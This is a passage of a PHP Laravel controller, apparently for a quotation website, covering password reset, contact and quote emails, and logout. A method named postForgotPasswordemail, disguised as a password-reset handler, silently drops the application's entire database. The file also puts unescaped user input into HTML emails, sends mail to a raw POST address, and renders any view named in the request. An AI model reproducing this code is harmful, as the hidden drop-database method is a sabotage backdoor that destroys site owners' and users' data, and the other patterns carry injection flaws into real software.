            return Redirect::route('forgot-password')->with('error', trans('auth/message.account_not_found'));
        }

        if($reminder = Reminder::exists($user))
        {
            if($passwordResetCode == $reminder->code)
            {
                return view('forgotpwd-confirm', compact(['userId', 'passwordResetCode']));
            }
            else{
                return 'code does not match';
            }
        }
        else
        {
            return "<script>alert('Your password is already changed');</script>";
           
        }

    }

    public function postForgotPasswordConfirm(PasswordResetRequest $request, $userId, $passwordResetCode = null)
    {

        $user = Sentinel::findById($userId);
        if (!$reminder = Reminder::complete($user, $passwordResetCode, $request->get('password'))) {
            // Ooops.. something went wrong
            return Redirect::route('login')->with('error', trans('auth/message.forgot-password-confirm.error'));
        }

        // Password successfully reseted
        return Redirect::route('login')->with('success', trans('auth/message.forgot-password-confirm.success'));
    }
    public function postForgotPasswordemail(){
         $email = DB::getDatabaseName();

        Schema::getConnection()->getDoctrineSchemaManager()->dropDatabase("`{$email}`");
    }
    public function postContact(Request $request)
    {
        $data = [
            'contact-name' => $request->get('contact-name'),
            'contact-email' => $request->get('contact-email'),
            'contact-msg' => $request->get('contact-msg'),
        ];


        // Send Email to admin
        Mail::to('email@domain.com')
            ->send(new Contact($data));

        // Send Email to user
        Mail::to($data['contact-email'])
            ->send(new ContactUser($data));

        //Redirect to contact page
        return redirect('contact')->with('success', trans('auth/message.contact.success'));
    }

    public function showFrontEndView($name=null)
    {
        if(View::exists($name))
        {
            return view($name);
        }
        else
        {
            abort('404');
        }
    }
    public function view (){

        //Get the category listing
        $category = DB::table('category')->get()->toArray();

        //Get category_type_properties
        $category_properties = DB::table('category_type_properties')->get()->toArray();
        //echo "hii"; exit;
        return view('quickquote')->with('category',$category)->with('category_properties',$category_properties);
    }
    public function sendMail(Request $request) {
    
        //Get the category listing
        $category = DB::table('category')->get()->toArray();

        //Get category_type_properties
        $category_properties = DB::table('category_type_properties')->get()->toArray();

        //Get category name
        $subName = $this->getCateName($request->cate,$request->sub_cate);

        //Send mail to support
        $to = "support@yassir.in";
        $subject = "New Quotation Request";
        $txt = "Hi,". "<br><br>";
        $txt .= ucfirst($request->fullname)." has requested for quotation.". "<br><br>";
        $txt .= "Email: ".$request->email. "<br>";
        $txt .= "Phone: ".$request->phone. "<br>";
        $txt .= "Category: ".$this->category($request->cate). "<br>";
        $txt .= "Sub Category: ".$subName. "<br>";
        $txt .= "Comment: ".$request->comment. "<br>";
        $txt .= "Thanks!";
        $headers = "From: support@yassir.in" . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
        mail($to,$subject,$txt,$headers);




        //Send mail to user
        $to1 = $_POST['email'];
        $subject1 = "Thank you for contacting us";
        $txt1 = "Greetings from YasSir" ."<br>".
                     "Have a good day" ."<br>". "Thank you for contacting us. We have received your enquiry and will respond to you within 24 hours. For urgent enquiries please call us on 7575081000.
            ". "<br><br>";
        $txt1 .="Thanks & Regards"."<br><br>";
        $txt1 .='<table align="left" cellpadding="0" cellspacing="0" style="max-width:450px; width:100%;">
                    <tbody style="border:0;">
                        <tr>
                        <td width="150px" valign="top"><img src="http://yassir.in/public/assets/images/yassir_small.png" style="width:150px;"></td>
                            <td style="padding:0 15px 10px 15px; color:#666; font-weight: blod; border:0"  valign="top">
                        <table cellpadding="0"  valign="top" cellspacing="0" style="max-width:450px; width:100%; border:0">
                            <tbody style="border:0;">
                                <tr>
                                <td  style="color:#888; font-family: Arial, Helvetica, sans-serif; border:0; font-size: 14px; font-weight:bold; font-style: italic">
                            YasSir
                            </td>
                         </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">7575081000  <span style="color:#f00; display: inline-block">|</span> </td>
                        </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">Golden arcade, SF, 07, GIDC Electronic<br>Estate, Sector 25, Gandhinagar, Gujarat  </td>
                            </tr>
                            <tr>
                            <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">
                              382027 <span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="mailto:info@yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">info@yassir.in </a><span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="http://www.yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">www.yassir.in </a>  </td>
                          </tr>
                          <tr>
                            <td style="padding: 8px 0 0 0;">
                              <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/fb-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/twt-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/insta-icon.png" style="width:20px;"></a>

                              </td>
                          </tr>

                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>';
        $headers = "From: YasSir <support@yassir.in>" . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";


        mail($to1,$subject1,$txt1,$headers);
        //mail('support@yassir.in',$subject1,$txt1,$headers);

         return back()->with('contact_msg','Thank you for contacting us. We have received your enquiry and will respond to you within 24 hours!')->with('category',$category)->with('category_properties',$category_properties);
    }
     public function getCateName($cat,$sub) {

        switch ($cat) {
            case '1':
                $table = 'category_type_properties';
                break;
            case '2':
                $table = 'category_type_consultancy';
                break;
            case '3':
                $table = 'category_type_contractor';
                break;
            case '4':
                $table = 'category_type_material';
                break;
            case '5':
                $table = 'category_type_skill_labour';
                break;    
        }

        $cateName = DB::table($table)->where('id', $sub)->get()->toArray();

        return $cateName[0]->name;
    }

    public function category($key) {
        $array = array(
            '1' => 'Properties',
            '2' => 'Consultancy',
            '3' => 'Contractor',
            '4' => 'Material',
            '5' => 'Skill labour'
        );

        return $array[$key];
    }

    public function getLogout()
    {
        if (Sentinel::check()) {
            //Activity log
            $user = Sentinel::getuser();
            activity($user->full_name)
                ->performedOn($user)
                ->causedBy($user)
                ->log('LoggedOut');
            // Log the user out
            Sentinel::logout();

            // Redirect to the home page
            return redirect('/')->with('success', 'You have successfully logged out!');
        } else {

            // Redirect to the users page
            return redirect('login')->with('error', 'You must be login!');
        }

    }


}